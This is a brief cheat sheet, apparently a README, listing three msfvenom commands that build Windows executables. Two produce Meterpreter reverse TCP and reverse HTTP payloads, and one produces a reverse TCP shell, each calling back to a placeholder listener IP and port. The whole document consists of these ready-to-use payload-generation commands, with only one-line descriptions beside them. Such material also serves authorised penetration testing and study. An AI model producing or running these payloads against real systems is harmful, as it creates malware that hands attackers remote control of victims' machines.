# Msfvenom-Cheat-Sheet
A list of msfvenom commands

## Windows Payloads
| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > example.exe     | Creates a simple TCP Payload |
|msfvenom -p windows/meterpreter/reverse_http LHOST=(IP Address) LPORT=(Your Port) -f exe > example.exe     | Creates a simple HTTP Payload |
|msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > example.exe | Creates a simple TCP Shell |
